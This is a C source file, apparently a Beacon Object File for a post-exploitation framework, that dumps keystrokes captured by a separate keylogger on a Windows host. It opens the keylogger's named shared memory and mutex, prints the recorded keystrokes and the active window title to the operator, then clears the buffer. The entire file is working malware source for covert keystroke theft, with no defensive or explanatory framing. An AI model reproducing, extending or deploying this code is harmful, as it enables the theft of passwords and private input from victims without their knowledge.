#include <windows.h>

void printoutput(BOOL done);
#include "base.c"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenFileMappingA(DWORD, BOOL, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$UnmapViewOfFile(LPCVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenMutexA(DWORD, BOOL, LPCSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReleaseMutex(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);

#define KEYLOG_MAGIC      0xDEADBEEF
#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"

#pragma pack(push, 1)
typedef struct {
    DWORD  magic;
    DWORD  buf_size;
    DWORD  write_pos;
    DWORD  total_keys;
    DWORD  hook_tid;
    CHAR   active_window[256];
} KEYLOG_CTX;
#pragma pack(pop)

void go(char *args, int len)
{
    bofstart();


    HANDLE hMap = KERNEL32$OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, KEYLOG_MAP_NAME);
    if (!hMap) {
        internal_printf("[-] Keylogger is not running (shared memory not found)\n");
        printoutput(TRUE);
        bofstop();
        return;
    }


    KEYLOG_CTX *ctx = (KEYLOG_CTX*)KERNEL32$MapViewOfFile(
        hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    if (!ctx) {
        internal_printf("[-] MapViewOfFile failed (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    if (ctx->magic != KEYLOG_MAGIC) {
        internal_printf("[-] Shared memory invalid (bad magic)\n");
        KERNEL32$UnmapViewOfFile(ctx);
        KERNEL32$CloseHandle(hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    CHAR *buf = (CHAR*)((BYTE*)ctx + sizeof(KEYLOG_CTX));


    HANDLE hMutex = KERNEL32$OpenMutexA(MUTEX_ALL_ACCESS, FALSE, KEYLOG_MUTEX_NAME);
    if (!hMutex) {
        internal_printf("[-] Could not open mutex (err: %lu)\n", KERNEL32$GetLastError());
        KERNEL32$UnmapViewOfFile(ctx);
        KERNEL32$CloseHandle(hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    KERNEL32$WaitForSingleObject(hMutex, 5000);

    DWORD write_pos  = ctx->write_pos;
    DWORD total_keys = ctx->total_keys;

    if (write_pos == 0) {
        internal_printf("[*] Buffer is empty -- no keystrokes captured since last flush\n");
        KERNEL32$ReleaseMutex(hMutex);
        KERNEL32$CloseHandle(hMutex);
        KERNEL32$UnmapViewOfFile(ctx);
        KERNEL32$CloseHandle(hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    internal_printf("[+] Keylogger dump -- %lu keystrokes captured\n", total_keys);
    internal_printf("    Active window : %s\n", ctx->active_window[0] ? ctx->active_window : "(unknown)");
    internal_printf("----------------------------------------\n");

    DWORD chunk = 512;
    DWORD offset = 0;
    CHAR tmp[513];

    while (offset < write_pos) {
        DWORD to_copy = write_pos - offset;
        if (to_copy > chunk) to_copy = chunk;
        MSVCRT$memcpy(tmp, buf + offset, to_copy);
        tmp[to_copy] = '\0';
        internal_printf("%s", tmp);
        offset += to_copy;
    }

    internal_printf("\n----------------------------------------\n");


    MSVCRT$memset(buf, 0, ctx->buf_size);
    ctx->write_pos  = 0;
    ctx->total_keys = 0;

    KERNEL32$ReleaseMutex(hMutex);


    KERNEL32$CloseHandle(hMutex);
    KERNEL32$UnmapViewOfFile(ctx);
    KERNEL32$CloseHandle(hMap);

    printoutput(TRUE);
    bofstop();
}
